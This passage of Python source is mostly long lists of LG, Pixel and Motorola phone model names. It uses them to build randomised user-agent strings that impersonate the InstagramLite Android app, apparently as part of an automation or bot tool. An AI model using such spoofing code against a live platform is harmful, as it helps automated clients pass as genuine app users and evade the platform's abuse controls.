'LG-GT540', 'LG-GT540', 'LG-GT540', 'LG-T540', 'LG-GT540f', 'LG-GT540f', 'LG-GT540f', 'LG-GT540f', 'LG-GT540f', 'LG-GT540f', 'LG-GT540f', 'LG-GT540g', 'LG-GW620', 'LG-GW620', 'LG-F310L', 'LG-F310LR', 'LG-F310L', 'LG-F310L', 'LG-F310L', 'LG-F430L', 'LG-F430L', 'LG-F430L', 'LG-F430L', 'LG-F430L', 'LG-F430L', 'LG-F430L', 'LG-F430L', 'LG-H326', 'LG-H442', 'LG-H442', 'LG-H510', 'LG-H520', 'LG-H631MX', 'LG-H635A', 'LG-H635c', 'LG-H636', 'LG-H636', 'LG-H778', 'LG-H805', 'LG-H816T', 'LG-H848', 'LG-H848', 'LG-H930G', 'LG-H932BK', 'LG-H932SV', 'LG-H937', 'LG-H996', 'LG-M257', 'LM-K400', 'LGIAUSDQP6', 'LG-F440L', 'LG-F440L', 'LG-F440L', 'LG-F440L', 'LG-F440L', 'LGIFWVPDM3', 'L-02K', 'LG-H221AR', 'LG-H222', 'LG-H220', 'LG-H220', 'LG-H222', 'LG-H221', 'LG-K430', 'LG-K420', 'LG-K410', 'LG-M250', 'LG-M250', 'LGM-K121K', 'LGM-K121L', 'LGM-K121L', 'LGM-K121S', 'LG K10 PRO', 'LM-X410.FN', 'LM-X410(FG)', 'LM-X120', 'LG-M255', 'LG-M255', 'LG-M255', 'LG-M255', 'LG-M255', 'LG-M255', 'LGMP260', 'LG K20 Plus', 'LG-TP260', 'LG-K210', 'LG-K212', 'LM-K200', 'LG-K100', 'LGUS110', 'LG-AS110', 'LGL322DL', 'LM-X320', 'LM-X320', 'LM-X410PM', 'LM-X410UM', 'LM-K300', 'LGL355DL', 'LM-K330', 'LG-K361', 'LG-K373', 'LG-X230', 'LG-M151', 'LG-K121', 'LG-M160', 'LG-K130', 'LG-K130', 'LM-X420', 'LM-X420', 'LM-X430', 'LM-K410', 'LM-K420', 'LG-K450', 'LG-X220', 'LM-X520', 'LM-X540', 'LM-K510', 'LM-K510', 'LM-K520', 'LG-K540', 'LM-K525', 'LM-K526', 'LG K623', 'LG-X210', '480x782', 'LG-K330', 'LGMS330', 'LG-X230YK', 'LG-K350', 'LG-M200', 'LGM-K120K', 'LGM-K120S', 'LGM-K120L', 'LG-X240', 'LM-X212(G)', 'LGUS215', 'RS500', 'VS500PP', 'LM-X220QMA', 'LM-K920', 'LG-KH5200', 'LGKJXJHWE9', 'LG kp570', 'LG KP570/Teleca', 'LG-KU3700', 'LG-KU3700', 'LG-KU5400', 'LG-KU5400', 'LG-KU5400', 'LG-KU5400', 'LG-KU5400/20i', 'LG-KU5400/20i', 'LG-KU5400', 'LG-KU5900', 'LG-KU5900', 'LG-KU5900', 'LG-KU6900', 'LG-KU8800', 'LG-KU8800', 'LG-KU8800', 'LG-L', 'LG-D337', 'LG-D331', 'LG-D290', 'LG-D295', 'LG-D290', 'LG-L01D', 'LG-L01D', 'LG-L01D', 'LG-L01D', 'LG-L01F', 'LG-L122c', 'LGL125DL', 'LGL157BL', 'LG-D100AR', 'LG-D105', 'LG-D100', 'LG-D107', 'LG-D100', 'LG-D107', 'LG-D107', 'LG-D107', 'LG-D105', 'LG-D105', 'LG-L21', 'LGL21G', 'LGL21G/V100', 'LGL22', 'LG-L220L', 'LGL22C', 'LGL22C/V100', 'LGL25', 'LG-L260L', 'LG-L280L', 'LG-L290L', 'LG-D120AR', 'LG-D125', 'LG-D120', 'LG-D120', 'LG-D125', 'LG-D120', 'LG-D120AR', 'LG-D125', 'LG-D120AR', 'LG-D120', 'LG-D120', 'LG-D120', 'LG-L30L', 'LGL33L', 'LGL33L/V100', 'LGL34C', 'LGL34C', 'LGL34C/V100', 'LG-D157f', 'LG-D150', 'LG-D157f', 'LG-D157f', 'LG-D150', 'LG-D150', 'LG-D150', 'LG-D150', 'LGL35G/V100', 'LG-L38C', 'LG-L38C', 'LG-L38C', 'LG-D160', 'LG-D160', 'LG-D160', 'LG-D160', 'LG-D160', 'LG-D160/V10b', 'LG-D160/V10f', 'LG-L40G', 'LG-L40G', 'LG-L40G/V100', 'LG-X132', 'LG-X130g', 'LGL45C', 'LG-D213', 'LG-D227', 'LG-D221', 'LG-D227', 'LG-D227', 'LG-D227', 'LG-D221', 'LG-D221', 'LG-D221', 'LG-D227', 'LG-D221', 'LGL59BL', 'LG-X145', 'LG L60 x145', 'LG-X135', 'LG-X135', 'LG-X137', 'LGL64VL', 'LG-D280', 'LG-D285', 'LG-D285', 'LGLS620', 'LG-D321', 'LG-D320', 'LG-D325', 'LG-D321', 'LG-D329', 'LG-D329', 'LG-D340f8', 'LG-D340f8', 'LG-D340f8', 'LG-D340f8', 'LG-D340f8', 'LGL75C', 'LG-D373', 'LG-D373', 'LG-D373', 'LG-D380', 'LG-D385', 'LG-D370F', 'LG-D370', 'LG-D370', 'LG-D370', 'LG-D370', 'LG-D370', 'LG-D370', 'LG-D370', 'LGL85C', 'LGL86C', 'LG-D400', 'LG-D410', 'LG-D405', 'LG-L95G', 'VS820', 'LG-H324', 'LG-H340', 'LG-H320', 'LGMS345', 'LG-H345', 'LG-H342', 'LG-ll20', 'LG-LS670', 'LG-LS670', 'LG-LS670', 'LG-LS696', 'LG-LS696', 'LG-LS696', 'LG-LS696', 'LG-LS696', 'LG-LS696', 'LG-LS720', 'LG-LS720', 'LG-LS720', 'LG-LS855', 'LG-LS855', 'LG-LS855', 'LG-LS855', 'LG-LS855', 'LG-LS855', 'LG-LS860', 'LG-LS860', 'LG-LS860', 'LG-LS998U', 'LG-LU3000', 'LG-LU3000', 'LG-LU3000', 'LG-LU3000', 'LG-LU3100', 'LG-LU3100', 'LG-LU3700', 'LG-LU3700', 'LG-LU5400', 'LG-LU5400', 'LG-LU6200', 'LG-LU6200', 'LG-LU6200', 'LG-LU6200', 'LG-LU6200', 'LG-LU6200', 'LG-LU6200/V20e', 'LG-LU6500', 'LG-LU6500', 'LG-LU6800', 'LG-LU6800', 'LG-LU6800', 'LG-LU6800', 'LG-LU6800', 'LG-LU8300', 'LG-LU8300', 'VS870 4G', 'VS876', 'LGE VS876', 'LG-LW690', 'LG-LW690', 'LG-LW690', 'LG-LW770', 'LG-LW770', 'LG-H500', 'LG-H502', 'LG Max X155', 'LG-MS500', 'LG-MS690', 'LG-MS690', 'LG-MS690', 'LG-MS690', 'LG-MS690', 'LG-MS690', 'LG-MS690', 'LG-MS695', 'LG-MS695', 'LG-MS695', 'LG-MS695', 'LG-MS695', 'LG-MS695', 'LG-MS695', 'LG-MS695', 'LGMS769', 'LGMS769', 'LG-MS770', 'LG-MS770', 'LG-MS770', 'LG-MS770', 'LG-MS770', 'LG-MS840', 'LG-MS840', 'LG-MS840', 'LG-MS840', 'LG-MS910', 'LG-MS910', 'LG-MS910', 'LG-MS910', 'LG-MS910', 'LG-MS910', 'LG-MV300K', 'LG-MV300S', 'LG-P880', 'LG-P880', 'LG-P880', 'LG-P880', 'LG-P880', 'LG-P880', 'LG-P880', 'LG-P880', 'LG-P880', 'LG-P880', 'LG-P880', 'LG-P880', 'LG-P880', 'LGL39C', 'LGL39C', 'LGL39C/V100', 'LG-VS450PP', 'LGMS659', 'LG-P655H', 'LG-P655H', 'LG-P655H', 'LG-P655H', 'LG-P655H', 'LG-P655H', 'LG-P655H', 'LG-P655H', 'LG-P875', 'LG-P875', 'LG-P875', 'LG-P875', 'LGMS500', 'LGMS500', 'LG-D505', 'LG-D505', 'LG-D505', 'LG-D505', 'LG-D505', 'LG-D505', 'LG-D505', 'LG-LS970', 'LG-F180K', 'LG-F180L', 'LG-E975', 'LG-E977', 'LG-E977', 'LG-F180S', 'LG-F180L', 'LG-F180L', 'LG-F180L', 'LG-F180K/30c', 'LG-F180K', 'LG-F180L', 'LG-E973', 'LG-E973/E97320h', 'LG-E973', 'LG-E973', 'LG-E973/E97310h', 'LG-E973/E97310f', 'LG-E980', 'LG-F240S', 'LG-F240L', 'LG-F240K/10z', 'LG-F240L', 'LG-F240L', 'LG-F240K/20j', 'LG-F240S', 'LG-F240S', 'LG-E986', 'LG-F240', 'LG-F240', 'LG-F240', 'LG-F240/240', 'LG-F240/240', 'LG-F240/240', 'LG-F240/240', 'LG-EF240', 'LG-F240', 'LG-F220K', 'LG-F220K/20f', 'LG-F220K/20f', 'LG-F220K/20d', 'LG-F220K/20c', 'LG-F220K', 'LG-F220K/10c', 'LG-F220K/10f', 'LG-F220K/30c', 'LG-E410i', 'LG-E410i', 'LG-E410i', 'LG-E415f', 'LG-E410', 'LG-E410i', 'LG-E410i', 'LG-E475f', 'LG-E475f', 'LG-E420', 'LG-E420', 'LG-E420', 'LG-E420', 'LG-E420', 'LG-E420', 'LG-E420', 'LG-E420', 'LG-E420', 'LG-E420', 'LG-E420', 'LG-E400/V10j', 'LG-E400', 'LG-E400', 'LG-E400', 'LG-E400', 'LG-E400', 'LG-E400', 'LG-E400', 'LG-E400', 'LG-E400/V10j', 'LG-E400/V10g', 'LG-E400', 'LG-E400/V10h', 'LG-E400/V10g', 'LG-E400/V10j', 'LG-E400/V10f', 'LG-E400f', 'LG-E400f', 'LG-E400f', 'LG-E400f', 'LG-E400f', 'LG-E400f', 'LG-E400f', 'LG-E400f', 'LG-E400f', 'LG-E400f', 'LG-E400f V10b', 'LG-E400f', 'LG-E435', 'LG-E430', 'LG-E430', 'LG-E430', 'LG-E435', 'LG-E435', 'LG-E435', 'LG-E435', 'LG-E440', 'LG-E440', 'LG-E470f', 'LG-E465f', 'LG-E465f', 'LG-E465f', 'LG-E440f', 'LG-E445', 'LG-E445', 'LG-E445', 'LG-E445', 'LG-E467f', 'LG-D170', 'LG-D170', 'LG-D170', 'LG-D175f', 'LG-E610', 'LG-E612g', 'LG-E610v/V10f', 'LG-E610v', 'LG-E612', 'LG-E612', 'LG-E612', 'LG-E610', 'LG-E610v', 'LG-E450', 'LG-E460', 'LG-E450f', 'LG-E450', 'LG-P705', 'LG-P705', 'LG-P705', 'LG-P705', 'LG-P705', 'LG-P705', 'LG-P705', 'LG-P705', 'P713', 'LG-P713', 'LG-P715', 'LG-P715', 'LG-P716', 'LG-P716', 'LG-P716', 'LG-P716', 'LG-P716', 'LG-P716', 'LG-P716', 'LG-P716', 'LG-P716', 'LG-P716', 'LGMS323', 'LGMS323', 'LG-D605', 'LG-D605', 'LG-D605', 'LG-D605', 'LG-D605', 'LG-D605', 'LG-D605', 'LG-D605', 'LG-D605/V10a', 'LG-F160L', 'LG-L160L', 'LG-F160K', 'LG-F160S', 'LG-F160L', 'LG-F160S', 'LG-F160LV', 'LG-L160L', 'LG-F160L', 'LG-F160S', 'LG-F160L', 'LG-F160K', 'LG-F160 SKL', 'LG-F260S', 'LG-F260S', 'LG-F260S', 'LG-F260S', 'LG-F260S', 'LG-F260S', 'LG-F260S', 'LG-F260S', 'LG-F260S', 'LG-F260S', 'LG-F120K', 'LG-F120K', 'LG-F120S', 'LG-F120L', 'LG-F120S', 'LG-F120L', 'LG-F120S', 'LG-F120L', 'LG-F120K/30d', 'LG-F120K/30b', 'LG-F120K/30a', 'LG-F120S', 'LG-F120S', 'LG-F120L', 'LG-P500h', 'LG-P500h', 'LG-P500h-parrot', 'LG-P500h/v20a', 'LG-P500h-parrot', 'LG-P500h/v20a', 'LG-P500h/v10a', 'LG-P500h-parrot', 'LG-P500h', 'LG-P500h-parrot', 'LG-P500h-parrot', 'LG-P500h', 'LG-V900', 'LG-V900', 'LG-V900', 'LG-V900', 'LG-V900', 'LG-V900', 'LG-V900', 'LG-V900', 'LG-V900', 'LG-V900', 'LG-V900', 'LG-V900', 'LG-V900', 'LG-V900', 'LG-V900', 'LGC660', 'LGC660', 'LGC660', 'VM670', 'LG-VM670', 'LG-VM670', 'LG-F100L', 'LG-F100S', 'LG-F100L', 'LG-F100L', 'LG-F100S', 'LG-F100S', 'LG-F100S', 'LG-F100L', 'LG-F100S', 'LG-F100L', 'LG-F100L', 'LG-F100L', 'LG-F100S', 'LG-F100L', 'LG-F100L', 'LG-F200L', 'LG-F200L', 'LG-F200S', 'LG-F200L', 'LG-F200S', 'LG-F200L', 'LG-F200L', 'LG-F200S', 'LG-F200L', 'LG-F200K/30g', 'LG-F200L', 'LG-F200K/30g', 'LG-F200S', 'LG-F200S', 'LG-F200L', 'LG-VS410PP', 'LG-VS410PP', 'LG-VS410PP', 'VS415PP', 'VS415PP', 'LGE VS415PP', 'VS425PP', 'LG-P350', 'LG-P350', 'LG-P350', 'LG-P350', 'LG-P350', 'LG-P350', 'LG-P350', 'LG-P350', 'LG-P350', 'LG-P350', 'LG-P350', 'LG-P350', 'LG-P350', 'LG-P350', 'LG-P350/V10g', 'LG-P350f', 'LG-P350f', 'LG-P350f', 'LG-P350f', 'LG-P350f', 'LG-P350f', 'LG-P350f', 'LG-P350f', 'LG-P350g', 'LG-P350g', 'LG-P350g', 'LG-P350g', 'LG-P350g', 'LG-P350g', 'LG-P350g', 'LG-P350g', 'LG-P451L', 'LG-P500', 'LG-P500', 'LG-P500', 'LG-P500', 'LG-P503', 'LG-P503', 'LG-P503', 'LG-P503', 'LG-P503', 'LG-P503', 'LG-P503', 'LG-P504', 'LG-P504', 'LG-P505/V10i', 'LG-P505/V11e', 'LG-P505/V20f', 'LG-P505/V20f', 'LG-P505/V20f', 'LG-P505', 'LG-P505/V11h', 'LG-P505/V10i', 'LG-P505/V11h', 'LG-P505/V10i', 'LG-P505/V11h', 'LG-P505/V10f', 'LG-P505', 'LG-P505CH', 'LG-P505CH', 'LG-P506', 'LG-P506', 'LG-P509', 'LG-P509', 'LG-P509', 'LG-P509', 'LG-P509', 'LG-P55R', 'LG-P655K', 'LG-P655K', 'LG-P659', 'LG-P659', 'LG-P659', 'LG-P659H', 'LG-P659H', 'LG-P659H', 'LG-P659H', 'LG-P690', 'LG-P690', 'LG-P690', 'LG-P690', 'LG-P690', 'LG-P690', 'LG-P690', 'LG-P690', 'LG-P690', 'LG-P690', 'LG-P690', 'LG-P690', 'LG-P690', 'LG-P690', 'LG-P690', 'LG-P690', 'LG-P690b', 'LG-P690b', 'LG-P690b', 'LG-P690b', 'LG-P690b', 'LG-P690f', 'LG-P690f', 'LG-P690f', 'LG-P692', 'LG-P692', 'LG-P692', 'LG-P692', 'LG-P698', 'LG-P698', 'LG-P698', 'LG-P698', 'LG-P698', 'LG-P698', 'LG-P698', 'LG-P698', 'LG-P698', 'LG-P698', 'LG-P698f', 'LG-P698f', 'LG-P698f', 'LG-P698f', 'LG-P698f', 'LG-P698f', 'LG-P700', 'LG-P700', 'LG-P700', 'LG-P700/V20c', 'LG-P700', 'LG-P700', 'LG-P700', 'LG-P700', 'LG-P700', 'LG-P700/V20c', 'LG-P700', 'LG-P700', 'LG-P700', 'LG-P700', 'LG-P708g', 'LG-P708g', 'LG-P708g', 'LG-P708g', 'LG-P708g', 'LG-P708g', 'LG-P708g', 'LG-P708g', 'LG-P708g', 'LG-P713GO', 'LG-P713GO', 'LG-P713GO', 'LG-P713GO', 'LG-P720', 'LG-P720', 'LG-P720', 'LG-P720', 'LG-P720/V10e', 'LG-P720/V10e', 'LG-P720/V10e', 'LG-P720', 'LG-P720', 'LG-P720', 'LG-P720/V10e', 'LG-P720', 'LG-P720', 'LG-P720', 'LG-P720/V10e', 'LG-P720h', 'LG-P720h', 'LG-P720h', 'LG-P720h', 'LG-P720h', 'LG-P720h', 'LG-P720h', 'LG-P725', 'LG-P725', 'LG-P725', 'LG-P725', 'LG-P725/V10f', 'LG-P725', 'LG-P725', 'LG-P725', 'LG-P725', 'LG-P725', 'LG-P725', 'LG-P725', 'LG-P725', 'LG-P725', 'LG-P725/V10f', 'LG-P725', 'LG-P760', 'LG-P760', 'LG-P760', 'LG-P760/V20e', 'LG-P760', 'LG-P760', 'LG-P760', 'LG-P760', 'LG-P760', 'LG-P760', 'LG-P765', 'LG-P765', 'LG-P768', 'LG-P768', 'LG-P768', 'LG-P768', 'LG-P768', 'LG-P768', 'LG-P768', 'LG-P768', 'LG-P769', 'LG-P769', 'LG-P769', 'LG-P769', 'LG-P778', 'LG-P778', 'LG-P778', 'LG-P778', 'LG-P815L', 'LG-P870', 'LG-P870', 'LG-P870', 'LG-P870/P87020d', 'LG-P870', 'LG-P870', 'LG-P870/P87010i', 'LG-P870/P87010c', 'LG-P870h', 'LG-P870h', 'LG-P895', 'LG-P895', 'LG-P895', 'LG-P895', 'LG-P895', 'LG-P895qb', 'LG-P895qb', 'LG-P895qb', 'LG-P895qb', 'LG-P920', 'LG-P920', 'LG-P920', 'LG-P920', 'LG-P920', 'LG-P920', 'LG-P920', 'LG-P920', 'LG-P920', 'LG-P920', 'LG-P920', 'LG-P920', 'LG-P920', 'LG-P920', 'LG-P920', 'LG-P920h', 'LG-P920h', 'LG-P920h', 'LG-P920h', 'LG-P920h', 'LG-P920h', 'LG-P920h', 'LG-P925', 'LG-P925', 'LG-P925/P92530b', 'LG-P925', 'LG-P925', 'LG-P925/V20p', 'LG-P925/V20p', 'LG-P925/V20p', 'LG-P925/V10a', 'LG-P925/V10e', 'LG-P925g', 'LG-P925g', 'LG-P925g', 'LG-P925g', 'LG-P925g', 'LG-P925g', 'LG-P925g', 'LG-P929', 'LG-P930/V20c', 'LG-P930', 'LG-P930', 'LG-P930/V20c', 'LG-P930/V20f', 'LG-P930/V20c', 'LG-P930', 'LG-P935', 'LG-P935', 'LG-P935', 'LG-P935', 'LG-P935', 'LG-P935', 'LG-P936', 'LG-P936', 'LG-P936', 'LG-P936', 'LG-P936/V20c', 'LG-P936/V20c', 'LG-P936/V20c', 'LG-P936', 'LG-P936', 'LG-P936/V20c', 'LG-P936/V20c', 'LG-P936', 'LG-P936', 'LG-P936/V10e', 'LG-P936/V10e', 'LG-P936', 'LG-P940', 'LG-P940', 'LG-P940', 'LG-P940', 'LG-P940/V20d', 'LG-P940', 'LG-P940', 'LG-P940/V20d', 'LG-P940', 'LG-P940/V20d', 'LG-P940', 'LG-P940', 'LG-P940', 'LG-P940', 'LG-P940/V10h', 'LG-P940h/', 'LG-P940h/', 'LG-P940h', 'LG-P940h', 'LG-P940h', 'LG-P970', 'LG-P970', 'LG-P970', 'LG-P970', 'LG-P970', 'LG-P970', 'LG-P970', 'LG-P970', 'LG-P970', 'LG-P970', 'LG-P970', 'LG-P970g', 'LG-P970g', 'LG-P970g', 'LG-P970g', 'LG-P970g', 'LG-P970h', 'LG-P970h', 'LG-P970h', 'LG-P970h', 'LG-P970h', 'LG-P970h', 'LG-P970h', 'LG-P970h', 'LG-P970h', 'LG-P990', 'LG-P990', 'LG-P990', 'LG-P990', 'LG-P990', 'LG-P990/P99030b', 'LG-P990', 'LG-P990', 'LG-P990', 'LG-P990', 'LG-P990h', 'LG-P990h', 'LG-P990h', 'LG-P990h', 'LG-P990h', 'LG-P990h', 'LG-P990H', 'LG-P990h', 'LG-P990hN', 'LG-P990hN', 'LG-P990hN', 'LG-P990hN', 'LG-P990hN', 'LG-P990hN', 'LG-P990hN', 'LG-P993', 'LG-P993', 'LG-P999', 'LG-P999', 'LG-P999', 'LG-P999', 'LG-P999', 'LG-P999', 'LG-P505R', 'LG-P505R', 'LG-P505R', 'LG-P505R', 'LG-P505R', 'LG-P505R', 'LG-P505R', 'LG-K371', 'LG-M150', 'LM-X210APM', 'LGL62VL', 'LGL61AL', 'LM-X410.FG', 'LML414DL', 'LML413DL', 'LGL455DL', 'LG Prime', 'LG-H522', '801LG', 'LM-Q710(FGN)', 'LM-Q710.FGN', 'LM-Q310N', 'LM-Q310N', 'LM-Q510N', 'LM-Q520N', 'LM-Q520N', 'LGM-X600L', 'LG-M700', 'LG-M703', 'LM-X525', 'LM-Q630', 'LM-Q630N', 'LM-Q610.FG', 'LM-Q610(FGN)', 'LM-Q610.FGN', '1080x2034', 'LM-Q725S', 'LM-Q725L', 'LM-Q725K', 'LM-Q620', 'LG-H970', 'LGM-X800L', 'LGM-X800K', 'LM-Q815L', 'LM-Q815K', 'LM-Q815S', 'LM-Q925S', 'LM-Q925L', 'LM-Q925K', 'LM-Q925L', 'LM-Q927L', 'LM-Q920N', 'LGV33', 'LGT31', 'LGT32', 'LGT32', 'LG-R220DS', 'LGL58VL', 'LG-X190', 'LG-X190', 'LGL43AL', 'LGL44VL', 'LGL158VL', 'LML211BL', 'LG-H343', 'LG-M154', 'LGE RS501', 'LGM-X100S', 'LGL423DL', 'VS930 4G', 'LG-H422', 'LG-H440n', 'LG-H420', '402LG', '402LG', 'LG-K120', 'LG-MS870', 'LG-MS870', 'LG-MS870', 'L-03K', 'L-01L', 'L-41A', 'LG Stylo 3 Plus', 'LG Stylo 2 Plus', 'LGL82VL', 'LGLS775', 'LG-K557', 'LG-K550', 'VS835', 'LG-M430', 'LGL84VL', 'LG-LS777', 'LG-M470', 'LGMP450', 'LG-Q710AL', 'LML713DL', 'LG-Q710PL', 'LM-Q720', 'LM-Q720', 'LGL722DL', 'LGL722DL', 'LM-Q730', 'LG-K520', 'LG-F720L', 'LG-K535', 'LG-K530', 'LG-M400', 'LG-SU370', 'LG-SU370', 'LG-SU370', 'LG-SU370', 'LG-SU540', 'LG-SU540', 'LG-SU540', 'LG-SU540', 'LG-SU640', 'LG-SU640', 'LG-SU640', 'LG-SU640', 'LG-SU660', 'LG-SU660', 'LG-SU660', 'LG-SU660', 'LG-SU660', 'LG-SU660', 'LG-SU660', 'LG-SU660', 'LG-SU660', 'LG-SU760', 'LG-SU760', 'LG-SU760', 'LG-SU760', 'LG-SU760', 'LG-SU760', 'LG-SU760', 'LG-SU760', 'LG-SU870', 'LG-SU870', 'LG-SU870', 'LG-SU870', 'LG-SU870', 'LG-SU870', 'LG-SU880', 'LG-SU880', 'LG-SU880', 'LG-SU880', 'LGTGTXBKM7', 'VS810PP', 'LGL52VL', 'LGL51AL', 'LGLS660', 'LGLS660', 'LGLS660', 'LGLS660', 'LGLS660', 'LGLS660', 'LGLS660', 'LGLS665', 'LGLS675', 'LG-SP200', 'LM-X220PM', 'LGTSHARQK5', 'LG-F820L', 'LG-F820L', 'LGU-PQV1', 'LGUERTPOL6', 'LG-UK495', 'LGUK932', 'LGL41C', 'LGL41C/V100', 'LGUS375', 'LGUS550', 'LG-US670', 'LG-US670', 'LG-US670', 'LG-US670', 'LG-US730', 'LG-US730', 'LGUS998', 'LGUSQNRNA1', 'LG-F600S', 'LG-H901', 'LG-F600K', 'LG-H960', 'LG-K428', 'LG-H961N', 'LG-H961AN', 'LG-H915', 'VS995', 'LG-LS997', 'LG-H918', 'LG-F800L', 'LG-H990', 'LG-US996', 'L-01J', 'VS996', 'LG-US998', 'LG-H933', 'LGM-V300L', 'L-01K', 'LGV35', 'LM-V350', 'LM-V350N', 'LM-V405', 'LM-V409N', 'LG-V409UA', 'LG-V425', 'LG-V498', 'LG-V498S1', 'LG-V498S2', 'LM-V450', 'LM-V510N', 'LG-V510', 'L-51A', 'LM-V600', 'A001LG', 'LG-V607L', 'LG-V750', 'LG-V901', 'LG-V901', 'LG-V901', 'LG-V905R', 'LG-V905R', 'LG-V905R', 'LG-V905R', 'LG-V909', 'LG-V909', 'LG-V909', 'LG-V909', 'LG-V909', 'LG-V909', 'LG-V909', 'LM-V700N', 'LM-G910', 'LM-G900', 'L-52A', 'LM-G900TM', 'LG-LS840', 'LG-LS840', 'LG-LS840', 'LG-LS840', 'LG-vk410', 'LG-VK410', 'LG-VK810', 'LG-VM696', 'LG-VM696', 'LG-VM696', 'LG-VM696', 'LG-VM701', 'LG-VM701', 'LG-VM701', 'Android 2.3.4', 'LGLS740', 'LGLS740', 'LG-LS740', 'LGLS740', 'LGLS751', 'LG-VS660', 'LG-VS700', 'LG-VS700', 'LG-VS700', 'LG-VS890', 'LG-VS980', 'LG-VS986', 'LG-VS996', 'LG-F300L', 'LG-F300S', 'LG-F300K', 'LG-F300L', 'LG-F300K/20j', 'LG-F300L', 'LG-F300K/20f', 'LG-F300K/20b', 'LG-F300S', 'LG-F300L', 'LG-F300K/20j', 'LG-F300K/20f', 'LG-F300S', 'LG-F300S', 'LG-F300L', 'LG-F300L', 'VX1', 'VX4', 'LMX130IM', 'LM-K310IM', 'LG W11', 'LM-X440IM', 'LM-X440ZM', 'LM-X600IM', 'LM-K315IM', 'LM-K610IM', 'LG Watch Urbane', 'LG-D486', 'LG-D486', 'LG-D486', 'LG-D486', 'LG-D486', 'LG-D486', 'LG-T480S', 'LG-T480K', 'LG-T480S', 'LG-T480K/10b', 'LG-T480S', 'LG-T480K/10b', 'LG-T480S', 'LG-T480K/10c', 'LG-T480K/10b', 'LG-T480S', 'LG-T480S', 'LG-T480K/10c', 'LG-T480K/10b', 'LG-T480K', 'LG-H410', 'LG-F610S', 'LM-F100', 'LG-K580', 'LG-F690S', 'LG-US601', 'LG-M327', 'LG-M322', 'LG-SP320', 'LG-K600', 'LG-K240', 'LGUS610', 'LG-F750K', 'LG-K220', 'LG-M320', 'LM-X510WM', 'LM-K500', 'LGL555DL', 'LG-F740L', 'LG-K200', 'LGL56VL', 'LGK200F', 'ar LGLS676', 'LGL53BL', 'LG-H700', 'LG-US701', 'LG-H700', 'LG-M710ds', 'LG-X160', 'LG-X160', 'LG-X160t', 'LG-X170fTV', 'LG-X170g', 'LG-X180g', 'LM-X210LMW', 'LM-X210K', 'LM-X210L', 'LM-X210S', 'LM-X220N', 'LG-X215', 'LM-X415K', 'LM-X410S', 'LM-X410K', 'LM-X420N', 'LM-X415S', 'LM-X415L', 'LM-X410L', 'LM-X415S', 'LGM-X401L', 'X5-LG', 'LM-X510K', 'LM-X510S', 'LM-X510L', 'LGM-X320K', 'LGM-X320L', 'LGM-X320S', 'LGM-X320S', 'LGM-X320S', 'LM-X625N1', 'LG-X760', 'LG-X760E', 'LG-X760W', 'LGL15G', 'LGL15G/V100', 'LGL16C', 'LGL16C', 'LGL16C/V100', 'LG-Y870S', 'LG-H650', 'LM-X210VPP'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; LGE/lge; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Pixel':
                    self.android_version = random.choice(['11', '10', '13'])
                    self.device_model = random.choice(['Pixel 2', 'G011A', 'Pixel 2 XL', 'Pixel 3', 'Pixel 3 XL', 'Pixel 3a', 'Pixel 3a XL', 'Pixel 4', 'PIXEL4X', 'Pixel 4 XL', 'UCBrowser', 'Pixel 4a', 'Pixel 4a (5G)', 'Pixel 5', 'Pixel 5a', 'Pixel 6', 'Pixel 6 Pro', 'Pixel 6a', 'Pixel 7', 'Pixel 7 Pro', 'Pixel 7a', 'Pixel C', 'Pixel XL', 'Pixel XL'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; Google/google; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Motorola':
                    self.android_version = random.choice(['9', '12', '11'])
                    self.device_model = random.choice(['MOT-A6020l37', 'MotoA953', 'XT603', 'XT682', 'MB865', 'MB865', 'MB860', 'MB860', 'MB860', 'MB860', 'MB860', 'MB860', 'Motorola Defy', 'XT320', 'MOT-XT320', 'XT557', 'XT556', 'XT555C', 'Droid', 'Momodesign MD Droid', 'Droid', 'DROID2', 'DROID2 GLOBAL', 'DROID2 GLOBAL', 'DROID2 GLOBAL', 'DROID3', 'XT894', 'DROID4', 'DROID4', 'DROID4 4G', 'Droid4X-WIN', 'Droid4X-WIN', 'DROID BIONIC', 'DROID BIONIC', 'DROID BIONIC 4G', 'DroidBox', 'XT1565', 'XT1030', 'XT1030', 'DroidPC Dual Core', 'DROID Pro', 'XT610', 'XT910', 'DROID RAZR', 'MOT-XT910S', 'XT910', 'DROID RAZR', 'XT910', 'MOT-XT910', 'DROID RAZR HD', 'XT910', 'DROID RAZR 4G', 'XT918', 'XT916', 'XT914', 'XT915', 'XT916', 'XT920', 'XT919', 'XT919', 'XT920', 'DROID RAZR HD', 'XT925', 'DROID RAZR HD', 'XT926', 'XT890', 'XT890', 'XT890', 'XT890', 'XT907', 'XT907', 'XT905', 'XT907', 'XT907', 'XT912', 'XT886', 'XT885', 'DROID RJ', 'XT1254', 'XT1254', 'XT1585', 'XT1080', 'XT1080', 'XT1080', 'Droid V3.0', 'DROIDX', 'DROIDX', 'DROIDX', 'DROIDX', 'DROIDX', 'DROID X2', 'DROID X2', 'Motorola E7 POWER', 'motorola edge', 'Motorola Edge S', 'motorola edge (2021)', 'motorola edge (2022', 'motorola edge (2022)', 'motorola edge 20', 'XT2153-1', 'motorola edge 20 pro', 'motorola edge 20 pro', 'motorola edge 30', 'motorola edge 30 neo', 'motorola edge 30 pro', 'motorola edge 40', 'motorola edge 40 pro', 'motorola edge plus', 'motorola edge plus', 'XT2125-4', 'xt2125-4', 'XT2175-2', 'XT2175-2', 'XT2201-2', 'XT2201-2', 'XT2201-2', 'XT881', 'XT901', 'XT316', 'XT531', 'motorola g8play', 'XT800W', 'XT626', 'MB200', 'MB405', 'MB5050', 'MotoMB511', 'MB520', 'MB525', 'MB525', 'MB526', 'MB526', 'MB526', 'MotoMB526', 'MB526', 'MB526', 'MB526', 'MB545', 'MB7102', 'MB855', 'MB8715', 'MB8716', 'MB8717', 'MB886', 'MB886', 'MB8866', 'Mixzo ME1025', 'ME525(Defy)', 